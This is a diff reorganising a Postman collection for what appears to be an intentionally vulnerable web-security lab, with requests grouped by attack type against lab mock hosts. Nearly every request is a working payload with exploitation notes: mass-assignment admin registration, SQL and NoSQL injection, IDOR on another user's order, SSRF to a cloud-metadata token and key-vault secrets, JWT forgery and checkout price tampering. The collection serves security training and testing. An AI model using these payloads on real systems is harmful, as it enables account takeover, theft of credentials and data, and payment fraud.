@@ -17,258 +17,296 @@
   ],
   "item": [
     {
-      "name": "01 Login (form note)",
-      "request": {
-        "method": "POST",
-        "header": [
-          {
-            "key": "Content-Type",
-            "value": "application/x-www-form-urlencoded"
-          }
-        ],
-        "body": {
-          "mode": "urlencoded",
-          "urlencoded": [
-            {
-              "key": "username",
-              "value": "alice",
-              "type": "text"
+      "name": "Auth",
+      "item": [
+        {
+          "name": "01 Login (form note)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/x-www-form-urlencoded"
+              }
+            ],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "username",
+                  "value": "alice",
+                  "type": "text"
+                },
+                {
+                  "key": "password",
+                  "value": "alice123",
+                  "type": "text"
+                }
+              ]
             },
-            {
-              "key": "password",
-              "value": "alice123",
-              "type": "text"
-            }
-          ]
-        },
-        "url": "{{baseUrl}}/account/login",
-        "description": "NOTE: Browser login sets a Flask session cookie. In Postman, enable cookie jar (or copy Set-Cookie) so later BOLA/checkout requests stay authenticated as alice. Prefer the browser + Caido for cookie labs; use this request to mint a session for API follow-ups."
-      },
-      "response": []
-    },
-    {
-      "name": "02 Register with role=admin (JSON)",
-      "request": {
-        "method": "POST",
-        "header": [
-          {
-            "key": "Content-Type",
-            "value": "application/json"
+            "url": "{{baseUrl}}/account/login",
+            "description": "NOTE: Browser login sets a Flask session cookie. In Postman, enable cookie jar (or copy Set-Cookie) so later BOLA/checkout requests stay authenticated as alice. Prefer the browser + Caido for cookie labs; use this request to mint a session for API follow-ups."
           },
-          {
-            "key": "Accept",
-            "value": "application/json"
-          }
-        ],
-        "body": {
-          "mode": "raw",
-          "raw": "{\n  \"email\": \"evil@example.com\",\n  \"username\": \"eviladmin\",\n  \"password\": \"evil123\",\n  \"display_name\": \"Evil Admin\",\n  \"role\": \"admin\"\n}"
+          "response": []
         },
-        "url": "{{baseUrl}}/account/register",
-        "description": "Mass assignment: JSON body includes role=admin. Change username/email if already taken. Response includes role and api_token when Accept/Content-Type is JSON."
-      },
-      "response": []
-    },
-    {
-      "name": "03 Search SQLi",
-      "request": {
-        "method": "GET",
-        "header": [],
-        "url": {
-          "raw": "{{baseUrl}}/search?q=' OR '1'='1",
-          "host": ["{{baseUrl}}"],
-          "path": ["search"],
-          "query": [
-            {
-              "key": "q",
-              "value": "' OR '1'='1"
-            }
-          ]
-        },
-        "description": "SQL injection in product search. Try UNION-based payloads from docs/exploits/ once the basic OR payload works."
-      },
-      "response": []
-    },
-    {
-      "name": "04 Tags NoSQL",
-      "request": {
-        "method": "GET",
-        "header": [],
-        "url": {
-          "raw": "{{baseUrl}}/tags?tag[$ne]=noop",
-          "host": ["{{baseUrl}}"],
-          "path": ["tags"],
-          "query": [
-            {
-              "key": "tag[$ne]",
-              "value": "noop"
-            }
-          ]
-        },
-        "description": "NoSQL injection via operator-style query key. Alternate: /tags?q={\"$ne\":null} or a JSON filter that matches internal staff-only tags."
-      },
-      "response": []
-    },
-    {
-      "name": "05 Order BOLA as alice",
-      "request": {
-        "method": "GET",
-        "header": [],
-        "url": "{{baseUrl}}/orders/1",
-        "description": "BOLA/IDOR: after logging in as alice (session cookie), request Bob's seeded order id=1. Auth proves identity, not ownership."
-      },
-      "response": []
-    },
-    {
-      "name": "06 Preview SSRF (IMDS)",
-      "request": {
-        "method": "POST",
-        "header": [
-          {
-            "key": "Content-Type",
-            "value": "application/x-www-form-urlencoded"
-          }
-        ],
-        "body": {
-          "mode": "urlencoded",
-          "urlencoded": [
-            {
-              "key": "url",
-              "value": "http://imds:8090/metadata/identity/oauth2/token",
-              "type": "text"
-            }
-          ]
-        },
-        "url": "{{baseUrl}}/tools/preview",
-        "description": "SSRF: server-side fetch to the IMDS mock on the Docker network. Requires login session. Next: reuse returned token against http://keyvault:8091/secrets."
-      },
-      "response": []
-    },
-    {
-      "name": "07 Preview SSRF (Key Vault)",
-      "request": {
-        "method": "POST",
-        "header": [
-          {
-            "key": "Content-Type",
-            "value": "application/x-www-form-urlencoded"
-          }
-        ],
-        "body": {
-          "mode": "urlencoded",
-          "urlencoded": [
-            {
-              "key": "url",
-              "value": "http://keyvault:8091/secrets",
-              "type": "text"
-            }
-          ]
-        },
-        "url": "{{baseUrl}}/tools/preview",
-        "description": "SSRF follow-up: fetch Key Vault mock. May need Authorization header on a forged client request; in the UI lab, paste the IMDS token into a second preview or craft the call after reading the IMDS body."
-      },
-      "response": []
-    },
-    {
-      "name": "08 API v1 me (Bearer)",
-      "request": {
-        "auth": {
-          "type": "bearer",
-          "bearer": [
-            {
-              "key": "token",
-              "value": "{{apiToken}}",
-              "type": "string"
-            }
-          ]
-        },
-        "method": "GET",
-        "header": [
-          {
-            "key": "Accept",
-            "value": "application/json"
-          }
-        ],
-        "url": "{{baseUrl}}/api/v1/me",
-        "description": "Set collection variable apiToken from /account/me after login, or from register JSON response. JWT lab: forge alg=none or HS256 with weak secret."
-      },
-      "response": []
-    },
-    {
-      "name": "09 API v1 admin users",
-      "request": {
-        "auth": {
-          "type": "bearer",
-          "bearer": [
-            {
-              "key": "token",
-              "value": "{{apiToken}}",
-              "type": "string"
-            }
-          ]
-        },
-        "method": "GET",
-        "header": [
-          {
-            "key": "Accept",
-            "value": "application/json"
-          }
-        ],
-        "url": "{{baseUrl}}/api/v1/admin/users",
-        "description": "Authorization trusts role claim inside the JWT. Forge role=admin to list users (emails included)."
-      },
-      "response": []
-    },
-    {
-      "name": "10 Checkout (note)",
-      "request": {
-        "method": "POST",
-        "header": [
-          {
-            "key": "Content-Type",
-            "value": "application/x-www-form-urlencoded"
-          }
-        ],
-        "body": {
-          "mode": "urlencoded",
-          "urlencoded": [
-            {
-              "key": "shipping_name",
-              "value": "Alice",
-              "type": "text"
+        {
+          "name": "02 Register with role=admin (JSON)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Accept",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"evil@example.com\",\n  \"username\": \"eviladmin\",\n  \"password\": \"evil123\",\n  \"display_name\": \"Evil Admin\",\n  \"role\": \"admin\"\n}"
             },
-            {
-              "key": "shipping_address",
-              "value": "1 Curious Lane",
-              "type": "text"
+            "url": "{{baseUrl}}/account/register",
+            "description": "Mass assignment: JSON body includes role=admin. Change username/email if already taken. Response includes role and api_token when Accept/Content-Type is JSON."
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Injection",
+      "item": [
+        {
+          "name": "03 Search SQLi",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/search?q=' OR '1'='1",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "search"
+              ],
+              "query": [
+                {
+                  "key": "q",
+                  "value": "' OR '1'='1"
+                }
+              ]
             },
-            {
-              "key": "card_number",
-              "value": "4242424242424242",
-              "type": "text"
-            },
-            {
-              "key": "card_cvv",
-              "value": "123",
-              "type": "text"
-            },
-            {
-              "key": "amount_cents",
-              "value": "1",
-              "type": "text",
-              "description": "Price tamper: server trusts this field"
-            },
-            {
-              "key": "force_accept",
-              "value": "0",
-              "type": "text"
-            }
-          ]
+            "description": "SQL injection in product search. Try UNION-based payloads from docs/exploits/ once the basic OR payload works."
+          },
+          "response": []
         },
-        "url": "{{baseUrl}}/checkout",
-        "description": "NOTE: Needs a non-empty cart session cookie (add items in the browser first). Demonstrates amount_cents tampering and optional force_accept=1 fail-open. Prefer Caido replay of a real checkout POST from the browser."
-      },
-      "response": []
+        {
+          "name": "04 Tags NoSQL",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/tags?tag[$ne]=noop",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "tags"
+              ],
+              "query": [
+                {
+                  "key": "tag[$ne]",
+                  "value": "noop"
+                }
+              ]
+            },
+            "description": "NoSQL injection via operator-style query key. Alternate: /tags?q={\"$ne\":null} or a JSON filter that matches internal staff-only tags."
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Access Control (BOLA)",
+      "item": [
+        {
+          "name": "05 Order BOLA as alice",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "{{baseUrl}}/orders/1",
+            "description": "BOLA/IDOR: after logging in as alice (session cookie), request Bob's seeded order id=1. Auth proves identity, not ownership."
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "SSRF",
+      "item": [
+        {
+          "name": "06 Preview SSRF (IMDS)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/x-www-form-urlencoded"
+              }
+            ],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "url",
+                  "value": "http://imds:8090/metadata/identity/oauth2/token",
+                  "type": "text"
+                }
+              ]
+            },
+            "url": "{{baseUrl}}/tools/preview",
+            "description": "SSRF: server-side fetch to the IMDS mock on the Docker network. Requires login session. Next: reuse returned token against http://keyvault:8091/secrets."
+          },
+          "response": []
+        },
+        {
+          "name": "07 Preview SSRF (Key Vault)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/x-www-form-urlencoded"
+              }
+            ],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "url",
+                  "value": "http://keyvault:8091/secrets",
+                  "type": "text"
+                }
+              ]
+            },
+            "url": "{{baseUrl}}/tools/preview",
+            "description": "SSRF follow-up: fetch Key Vault mock. May need Authorization header on a forged client request; in the UI lab, paste the IMDS token into a second preview or craft the call after reading the IMDS body."
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "API / Bearer",
+      "item": [
+        {
+          "name": "08 API v1 me (Bearer)",
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{apiToken}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "Accept",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/api/v1/me",
+            "description": "Set collection variable apiToken from /account/me after login, or from register JSON response. JWT lab: forge alg=none or HS256 with weak secret."
+          },
+          "response": []
+        },
+        {
+          "name": "09 API v1 admin users",
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{apiToken}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "Accept",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{baseUrl}}/api/v1/admin/users",
+            "description": "Authorization trusts role claim inside the JWT. Forge role=admin to list users (emails included)."
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Checkout",
+      "item": [
+        {
+          "name": "10 Checkout (note)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/x-www-form-urlencoded"
+              }
+            ],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "shipping_name",
+                  "value": "Alice",
+                  "type": "text"
+                },
+                {
+                  "key": "shipping_address",
+                  "value": "1 Curious Lane",
+                  "type": "text"
+                },
+                {
+                  "key": "card_number",
+                  "value": "4242424242424242",
+                  "type": "text"
+                },
+                {
+                  "key": "card_cvv",
+                  "value": "123",
+                  "type": "text"
+                },
+                {
+                  "key": "amount_cents",
+                  "value": "1",
+                  "type": "text",
+                  "description": "Price tamper: server trusts this field"
+                },
+                {
+                  "key": "force_accept",
+                  "value": "0",
+                  "type": "text"
+                }
+              ]
+            },
+            "url": "{{baseUrl}}/checkout",
+            "description": "NOTE: Needs a non-empty cart session cookie (add items in the browser first). Demonstrates amount_cents tampering and optional force_accept=1 fail-open. Prefer Caido replay of a real checkout POST from the browser."
+          },
+          "response": []
+        }
+      ]
     }
   ]
 }
